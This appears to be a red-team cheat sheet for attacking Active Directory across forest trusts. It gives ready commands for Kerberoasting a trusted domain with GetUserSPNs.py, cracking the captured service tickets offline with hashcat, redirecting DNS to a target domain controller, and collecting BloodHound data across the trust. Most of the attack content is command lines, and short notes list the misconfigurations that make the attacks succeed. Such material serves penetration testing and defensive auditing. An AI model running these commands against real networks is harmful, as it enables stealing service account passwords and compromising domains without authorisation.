## Cross-Forest Kerberoasting

Credentials permit authentication into a trusted domain and SPNs exist for service accounts in that target forest.

List available SPNs in the target domain to identify high-value targets:

```
GetUserSPNs.py -target-domain <TARGET_DOMAIN> <DOMAIN>/<USERNAME>
```

Request TGS tickets for offline cracking and save to a file:

```
GetUserSPNs.py -request -target-domain <TARGET_DOMAIN> -outputfile <FILE_PATH> <DOMAIN>/<USERNAME>
```

Attempt offline recovery of the service account password:

```
hashcat -m 13100 <FILE_PATH> <WORDLIST_PATH>
```

- **Dangerous / misconfigured settings**
    
    - Privileged accounts (e.g., Domain Admins) assigned SPNs.
    - Service account password re-use across different domains.
- **Gotchas**
    
    - **Authentication failure** occurs if the provided credentials do not have rights to authenticate across the forest trust.
    - **Empty results** if you fail to specify the `-target-domain` flag when targeting the trusted forest.

---

## DNS Configuration for Remote Enumeration

The attack host is not configured with internal DNS and tools require a DC hostname instead of an IP address.

Update the local resolver to point to the target domain controller:

```
sudo nano /etc/resolv.conf
```

Configure the target domain and nameserver:

```
domain <DOMAIN>
nameserver <DC_IP>
```

> ⚠️ Gap: Manual edits to `/etc/resolv.conf` are **volatile** and frequently overwritten by DHCP or systemd-resolved, potentially breaking resolution mid-enumeration.

---

## Cross-Forest Group Enumeration

Bidirectional forest trusts exist and you need to map foreign domain group memberships or administrative relationships.

Collect BloodHound data from a target domain using cross-domain credentials:

```
bloodhound-python -d <TARGET_DOMAIN> -dc <DC_HOSTNAME> -c All -u <USERNAME>@<DOMAIN> -p <PASSWORD>
```

Consolidate JSON output for GUI ingestion:

```
zip -r <FILE_PATH>.zip *.json
```

- **Dangerous / misconfigured settings**
    
    - Foreign forest principals added to Domain Local Groups.
    - Bidirectional trusts allowing cross-forest administrative access.
- **Gotchas**
    
    - **Tool failure** occurs if the DC hostname cannot be resolved via DNS before execution.
    - **Incomplete data** if only one side of the trust is enumerated; both domains must be ingested to see foreign membership links.